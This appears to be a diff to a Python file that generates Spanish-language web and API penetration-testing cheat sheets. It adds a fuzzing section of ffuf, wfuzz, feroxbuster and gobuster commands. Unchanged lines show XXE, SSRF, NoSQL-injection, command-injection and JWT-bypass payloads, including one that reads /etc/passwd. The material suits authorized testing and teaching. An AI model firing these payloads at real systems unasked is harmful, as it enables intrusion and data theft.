@@ -470,6 +470,7 @@ GENERATED_DOCS = [
                     "katana -u $URL -d 3",
                     "arjun -u \"$URL/api/endpoint\"",
                     "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404",
+                    "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 $URL/FUZZ",
                 ],
                 "bullets": [
                     "Busca /api, /graphql, /swagger, /openapi.json, /docs, /admin, /debug, /actuator.",
@@ -477,7 +478,37 @@ GENERATED_DOCS = [
                 ],
             },
             {
-                "heading": "2. IDOR / BOLA",
+                "heading": "2. Fuzzing web y API",
+                "body": [
+                    "Usa fuzzing como una lupa, no como una ametralladora: primero fingerprint, luego rutas, archivos, vhosts y parametros por separado.",
+                ],
+                "code": [
+                    "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404",
+                    "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404,403",
+                    "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.html,.bak,.old,.zip -fc 404",
+                    "ffuf -u \"$URL/FUZZ/\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 2 -fc 404",
+                    "ffuf -u \"$URL/\" -H \"Host: FUZZ.$DOMAIN\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0",
+                    "ffuf -u \"$URL/api/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -fc 404",
+                    "ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -X POST -d 'FUZZ=test' -H 'Content-Type: application/x-www-form-urlencoded' -fs 0",
+                    "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 $URL/FUZZ",
+                    "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404,403 $URL/FUZZ/",
+                    "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 $URL/FUZZ",
+                    "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -z list,php-txt-html --hc 404 $URL/FUZZ.FUZ2Z",
+                    "wfuzz -c -H \"Host: FUZZ.$DOMAIN\" -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 0 $URL/",
+                    "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -d 'FUZZ=test' --hh 0 $URL/page.php",
+                    "feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,old,zip -k",
+                    "gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,old,zip -b 404",
+                    "gobuster vhost -u $URL -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain",
+                ],
+                "bullets": [
+                    "Si aparece wildcard, crea una ruta aleatoria y filtra por tamano/palabras/lineas: ffuf -fs/-fw/-fl o wfuzz --hh/--hw/--hl.",
+                    "Para vhosts, anade primero el dominio a /etc/hosts; si no, el Host header puede no resolver como esperas.",
+                    "No subas a wordlists enormes hasta entender codigos y tamanos normales de respuesta.",
+                    "Guarda hallazgos con status, size y contexto; despues valida manualmente con curl/Burp antes de explotar.",
+                ],
+            },
+            {
+                "heading": "3. IDOR / BOLA",
                 "body": ["La prueba mas rentable: cambiar IDs y comparar respuestas entre usuarios."],
                 "code": [
                     "GET /api/users/1001",
@@ -493,7 +524,7 @@ GENERATED_DOCS = [
                 ],
             },
             {
-                "heading": "3. JWT",
+                "heading": "4. JWT",
                 "code": [
                     "jwt_tool TOKEN",
                     "python3 - <<'PY'\nimport jwt\nprint(jwt.get_unverified_header('TOKEN'))\nprint(jwt.decode('TOKEN', options={'verify_signature': False}))\nPY",
@@ -505,7 +536,7 @@ GENERATED_DOCS = [
                 ],
             },
             {
-                "heading": "4. GraphQL",
+                "heading": "5. GraphQL",
                 "code": [
                     "POST /graphql",
                     "{\"query\":\"{__schema{types{name}}}\"}",
@@ -518,7 +549,7 @@ GENERATED_DOCS = [
                 ],
             },
             {
-                "heading": "5. SSRF",
+                "heading": "6. SSRF",
                 "body": ["Cualquier parametro que haga fetch de URL, avatar, webhook o import puede ser candidato."],
                 "code": [
                     "url=http://127.0.0.1:80",
@@ -534,7 +565,7 @@ GENERATED_DOCS = [
                 ],
             },
             {
-                "heading": "6. XXE",
+                "heading": "7. XXE",
                 "code": [
                     "<?xml version=\"1.0\"?>",
                     "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
@@ -546,7 +577,7 @@ GENERATED_DOCS = [
                 ],
             },
             {
-                "heading": "7. NoSQL Injection",
+                "heading": "8. NoSQL Injection",
                 "code": [
                     "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
                     "username[$ne]=admin&password[$ne]=x",
@@ -558,7 +589,7 @@ GENERATED_DOCS = [
                 ],
             },
             {
-                "heading": "8. File upload matrix",
+                "heading": "9. File upload matrix",
                 "table": [
                     ["Control", "Pruebas"],
                     ["Extension", "php, phtml, phar, jsp, aspx, svg, html, double extension."],
@@ -569,7 +600,7 @@ GENERATED_DOCS = [
                 ],
             },
             {
-                "heading": "9. Command injection",
+                "heading": "10. Command injection",
                 "code": [
                     "; id",
                     "&& id",
@@ -585,7 +616,7 @@ GENERATED_DOCS = [
                 ],
             },
             {
-                "heading": "10. Checklist web/API",
+                "heading": "11. Checklist web/API",
                 "bullets": [
                     "Descubrir endpoints y guardar requests reales.",
                     "Probar authz horizontal y vertical con dos usuarios.",
